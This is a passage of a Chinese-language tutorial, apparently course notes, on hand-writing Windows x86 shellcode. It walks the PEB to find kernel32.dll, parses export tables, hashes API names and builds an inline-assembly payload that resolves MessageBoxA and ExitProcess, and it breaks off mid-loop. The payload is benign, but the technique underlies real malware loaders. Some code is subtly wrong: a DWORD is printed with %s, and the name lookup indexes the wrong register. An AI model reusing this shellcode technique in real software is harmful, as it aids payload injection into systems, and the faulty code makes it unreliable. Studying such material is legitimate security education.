+&lt;pre tabindex="0" class="chroma">&lt;code class="language-cpp" data-lang="cpp">&lt;span class="line">&lt;span class="cl">&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="nc">_PEB_LDR_DATA&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">INT&lt;/span> &lt;span class="n">Length&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">UCHAR&lt;/span> &lt;span class="n">Initialized&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">SsHandle&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">LIST_ENTRY&lt;/span> &lt;span class="n">InLoadOrderModuleList&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">LIST_ENTRY&lt;/span> &lt;span class="n">InMemoryOrderModuleList&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">LIST_ENTRY&lt;/span> &lt;span class="n">InInitializationOrderModuleList&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">EntryInProgress&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">UCHAR&lt;/span> &lt;span class="n">ShutdownInProgress&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">ShutdownThreadId&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span> &lt;span class="n">PEB_LDR_DATA&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">PPEB_LDR_DATA&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>我们需要读取InInitializationOrderModuleList(初始化加载模块列表)来取得Kernel32.dll的地址，而此列表是LIST_ENTRY结构，此结构的微软官方说明如下&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-CPP" data-lang="CPP">&lt;span class="line">&lt;span class="cl">&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="nc">_LIST_ENTRY&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="nc">_LIST_ENTRY&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">Flink&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="nc">_LIST_ENTRY&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">Blink&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span> &lt;span class="n">LIST_ENTRY&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">PLIST_ENTRY&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">RESTRICTED_POINTER&lt;/span> &lt;span class="n">PRLIST_ENTRY&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;blockquote>
+&lt;p>我的调试结果：&lt;/p>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-CPP" data-lang="CPP">&lt;span class="line">&lt;span class="cl">&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="nc">LinkNode&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">_LIST_ENTRY&lt;/span> &lt;span class="n">Flink&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">_LIST_ENTRY&lt;/span> &lt;span class="n">Blink&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">DllAddress&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>由此可见，在链表节点的&lt;code>+0xC&lt;/code>处存在DllAddress，而任何程序前三个节点均为&lt;code>Ntdll -&amp;gt; KernelBa -&amp;gt; Kernel32&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h3 id="定位api地址逆向kernel32dll">定位API地址(逆向Kernel32.dll)&lt;/h3>
+&lt;blockquote>
+&lt;p>上一小节获得了Kernel32的加载基址，此小节由此获取&lt;code>LoadLibrary&lt;/code>和&lt;code>GetProcAddress&lt;/code>的地址用于获取其它函数地址&lt;/p>
+&lt;/blockquote>
+&lt;ul>
+&lt;li>偏移&lt;code>0x3C&lt;/code>是PEHeader的入口，标志字为&lt;code>0x5045&lt;/code>，文字为&lt;code>PE&lt;/code>&lt;/li>
+&lt;li>再加上&lt;code>0x78&lt;/code>的偏移是导出函数地址表的地址(Export Directory RVA)，此时的偏移为&lt;code>0x168&lt;/code>，值为&lt;code>0x262C&lt;/code>&lt;/li>
+&lt;li>再加上&lt;code>0x4&lt;/code>的偏移是导出函数地址表的大小(Export Directory Size)，值是&lt;code>0x6CFD&lt;/code>&lt;/li>
+&lt;li>在磁盘上时，节大小的最小单位是&lt;code>0x200&lt;/code>，但加载到内存中，节大小的最小单位变为&lt;code>0x1000&lt;/code>，而PE文件头在文件中占据的大小是&lt;code>0x400&lt;/code>，但是映射到内存中将占据&lt;code>0x1000&lt;/code>的大小，大小差值为&lt;code>0xC00&lt;/code>，所以&lt;code>0x262C&lt;/code>应当减去&lt;code>0xC00&lt;/code>，得到导出目录表&lt;code>Export Directory&lt;/code>的地址&lt;code>0x1A2C&lt;/code>&lt;/li>
+&lt;li>在导出目录表的&lt;code>0x28&lt;/code>偏移处是第一个导出函数的地址，序列号为&lt;code>0&lt;/code>&lt;/li>
+&lt;li>在导出目录表的&lt;code>0x67C&lt;/code>偏移处是函数&lt;code>GetProcAddress&lt;/code>的地址，序列号为&lt;code>198&lt;/code>&lt;/li>
+&lt;li>在导出目录表的&lt;code>0x340&lt;/code>偏移处是函数&lt;code>LoadLibraryA&lt;/code>的地址，序列号为&lt;code>244&lt;/code>&lt;/li>
+&lt;li>至此，两个重要函数的地址找到了&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="调试shellcodeexpstd0301">调试ShellCode(ExpStd0301)&lt;/h2>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-C" data-lang="C">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">char&lt;/span> &lt;span class="n">shellcode&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x10\x10&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">__asm&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">lea&lt;/span> &lt;span class="n">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">shellcode&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">push&lt;/span> &lt;span class="n">eax&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ret&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;hr>
+&lt;h2 id="动态api加载shellcode">动态API加载ShellCode&lt;/h2>
+&lt;h3 id="理论分析">理论分析&lt;/h3>
+&lt;ul>
+&lt;li>需要的API函数
+&lt;ul>
+&lt;li>MessageBoxA(User32.dll)&lt;/li>
+&lt;li>ExitProcess(Kernel32.dll)&lt;/li>
+&lt;li>LoadLibraryA(Kernel32.dll)&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>一个难题：如何在需要ShellCode尽可能短的情况下(不存在函数名称)找到API的地址&lt;/li>
+&lt;/ul>
+&lt;h3 id="函数名的hash算法">函数名的HASH算法&lt;/h3>
+&lt;h4 id="理论">理论&lt;/h4>
+&lt;ul>
+&lt;li>需要引入额外的HASH算法&lt;/li>
+&lt;li>计算的结果称为DIGEST(摘要)&lt;/li>
+&lt;li>对搜索到的函数名进行HASH&lt;/li>
+&lt;/ul>
+&lt;h4 id="算法expstd0302">算法(ExpStd0302)&lt;/h4>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-C" data-lang="C">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;windows.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">DWORD&lt;/span> &lt;span class="nf">GetHash&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">fun_name&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">digest&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">fun_name&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">digest&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">digest&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="mi">25&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">digest&lt;/span> &lt;span class="o">&amp;gt;&amp;gt;&lt;/span> &lt;span class="mi">7&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">digest&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">fun_name&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fun_name&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">digest&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">hash&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hash&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">GetHash&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;MessageBoxA&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Hash is %s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">hash&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;hr>
+&lt;h2 id="最终shellcodeexpstd0303">最终ShellCode(ExpStd0303)&lt;/h2>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt"> 10
+&lt;/span>&lt;span class="lnt"> 11
+&lt;/span>&lt;span class="lnt"> 12
+&lt;/span>&lt;span class="lnt"> 13
+&lt;/span>&lt;span class="lnt"> 14
+&lt;/span>&lt;span class="lnt"> 15
+&lt;/span>&lt;span class="lnt"> 16
+&lt;/span>&lt;span class="lnt"> 17
+&lt;/span>&lt;span class="lnt"> 18
+&lt;/span>&lt;span class="lnt"> 19
+&lt;/span>&lt;span class="lnt"> 20
+&lt;/span>&lt;span class="lnt"> 21
+&lt;/span>&lt;span class="lnt"> 22
+&lt;/span>&lt;span class="lnt"> 23
+&lt;/span>&lt;span class="lnt"> 24
+&lt;/span>&lt;span class="lnt"> 25
+&lt;/span>&lt;span class="lnt"> 26
+&lt;/span>&lt;span class="lnt"> 27
+&lt;/span>&lt;span class="lnt"> 28
+&lt;/span>&lt;span class="lnt"> 29
+&lt;/span>&lt;span class="lnt"> 30
+&lt;/span>&lt;span class="lnt"> 31
+&lt;/span>&lt;span class="lnt"> 32
+&lt;/span>&lt;span class="lnt"> 33
+&lt;/span>&lt;span class="lnt"> 34
+&lt;/span>&lt;span class="lnt"> 35
+&lt;/span>&lt;span class="lnt"> 36
+&lt;/span>&lt;span class="lnt"> 37
+&lt;/span>&lt;span class="lnt"> 38
+&lt;/span>&lt;span class="lnt"> 39
+&lt;/span>&lt;span class="lnt"> 40
+&lt;/span>&lt;span class="lnt"> 41
+&lt;/span>&lt;span class="lnt"> 42
+&lt;/span>&lt;span class="lnt"> 43
+&lt;/span>&lt;span class="lnt"> 44
+&lt;/span>&lt;span class="lnt"> 45
+&lt;/span>&lt;span class="lnt"> 46
+&lt;/span>&lt;span class="lnt"> 47
+&lt;/span>&lt;span class="lnt"> 48
+&lt;/span>&lt;span class="lnt"> 49
+&lt;/span>&lt;span class="lnt"> 50
+&lt;/span>&lt;span class="lnt"> 51
+&lt;/span>&lt;span class="lnt"> 52
+&lt;/span>&lt;span class="lnt"> 53
+&lt;/span>&lt;span class="lnt"> 54
+&lt;/span>&lt;span class="lnt"> 55
+&lt;/span>&lt;span class="lnt"> 56
+&lt;/span>&lt;span class="lnt"> 57
+&lt;/span>&lt;span class="lnt"> 58
+&lt;/span>&lt;span class="lnt"> 59
+&lt;/span>&lt;span class="lnt"> 60
+&lt;/span>&lt;span class="lnt"> 61
+&lt;/span>&lt;span class="lnt"> 62
+&lt;/span>&lt;span class="lnt"> 63
+&lt;/span>&lt;span class="lnt"> 64
+&lt;/span>&lt;span class="lnt"> 65
+&lt;/span>&lt;span class="lnt"> 66
+&lt;/span>&lt;span class="lnt"> 67
+&lt;/span>&lt;span class="lnt"> 68
+&lt;/span>&lt;span class="lnt"> 69
+&lt;/span>&lt;span class="lnt"> 70
+&lt;/span>&lt;span class="lnt"> 71
+&lt;/span>&lt;span class="lnt"> 72
+&lt;/span>&lt;span class="lnt"> 73
+&lt;/span>&lt;span class="lnt"> 74
+&lt;/span>&lt;span class="lnt"> 75
+&lt;/span>&lt;span class="lnt"> 76
+&lt;/span>&lt;span class="lnt"> 77
+&lt;/span>&lt;span class="lnt"> 78
+&lt;/span>&lt;span class="lnt"> 79
+&lt;/span>&lt;span class="lnt"> 80
+&lt;/span>&lt;span class="lnt"> 81
+&lt;/span>&lt;span class="lnt"> 82
+&lt;/span>&lt;span class="lnt"> 83
+&lt;/span>&lt;span class="lnt"> 84
+&lt;/span>&lt;span class="lnt"> 85
+&lt;/span>&lt;span class="lnt"> 86
+&lt;/span>&lt;span class="lnt"> 87
+&lt;/span>&lt;span class="lnt"> 88
+&lt;/span>&lt;span class="lnt"> 89
+&lt;/span>&lt;span class="lnt"> 90
+&lt;/span>&lt;span class="lnt"> 91
+&lt;/span>&lt;span class="lnt"> 92
+&lt;/span>&lt;span class="lnt"> 93
+&lt;/span>&lt;span class="lnt"> 94
+&lt;/span>&lt;span class="lnt"> 95
+&lt;/span>&lt;span class="lnt"> 96
+&lt;/span>&lt;span class="lnt"> 97
+&lt;/span>&lt;span class="lnt"> 98
+&lt;/span>&lt;span class="lnt"> 99
+&lt;/span>&lt;span class="lnt">100
+&lt;/span>&lt;span class="lnt">101
+&lt;/span>&lt;span class="lnt">102
+&lt;/span>&lt;span class="lnt">103
+&lt;/span>&lt;span class="lnt">104
+&lt;/span>&lt;span class="lnt">105
+&lt;/span>&lt;span class="lnt">106
+&lt;/span>&lt;span class="lnt">107
+&lt;/span>&lt;span class="lnt">108
+&lt;/span>&lt;span class="lnt">109
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">int main()
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">{
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> _asm{
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ;flag
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> nop
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> nop
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> nop
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> nop
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> nop
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> cld ;clear flag DF
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ;store hash
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push 0x1e380a6a ;hash of MessageBoxA
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push 0x4fd18963 ;hash of ExitProcess
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push 0x0c917432 ;hash of LoadLibraryA
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mov esi, esp ;esi = addr of first func hash
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> lea edi, [esi-0xc] ;edi = addr to start writing func
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ;make some stack space
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> xor ebx, ebx
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mov bh, 0x04
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> sub esp, ebx
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ;push a pointer to &amp;#34;user32&amp;#34; onto stack
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mov bx, 0x3233 ;rest of ebx is null
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push ebx
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push 0x72657375
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push esp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> xor edx, edx
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ;find base addr of kernel32.dll
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mov ebx, fs:[edx + 0x30] ;ebx = PEB address
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mov ecx, [ebx + 0x1c] ;ecx = loader data pointer
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mov ecx, [ecx + 0x1c] ;ecx = first entry in Initialization order list
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mov ecx, [ecx] ;ecx = second entry
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mov ebp, [ecx + 0x08] ;ebp = base address of kernel32.dll
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> find_lib_functions:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> lodsd ;load next hash into al and increment esi
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> cmp eax, 0x1e380a6a ;hash of MessageBoxA - trigger and LoadLibrary(&amp;#34;user32&amp;#34;)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> jne find_functions
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> xchg eax, ebp ;save current hash
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> call [edi - 0x8] ;LoadLibraryA
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> xchg eax, ebp ;restore current hash and update ebp with base address of user32.dll
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> find_functions:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> pushad ;preserve registers
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mov eax, [ebp + 0x3c] ;eax = start of PEheader
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mov ecx, [ebp + eax + 0x78];ecx = relative offset of export table
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> add ecx, ebp ;ecx = absolute addr of export table
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mov ebx, [ecx + 0x20] ;ebx = relative offset of names
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> add ebx, ebp ;ebx = absolute addr of names table
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> xor edi, edi ;edi will count through the functions
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> next_function_loop:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> inc edi ;inc function counter
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mov esi, [ebp + edi * 4] ;esi = relative offset of current function name
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> add esi, ebp ;esi = absolute addr of current function name
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> cdq ;dl will hold hash (we know eax is small)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> hash_loop:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movsx eax, byte ptr[esi]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> cmp al, ah
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> jz compare_hash
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ror edx, 7
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> add edx, eax
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> inc esi
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> jmp hash_loop
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
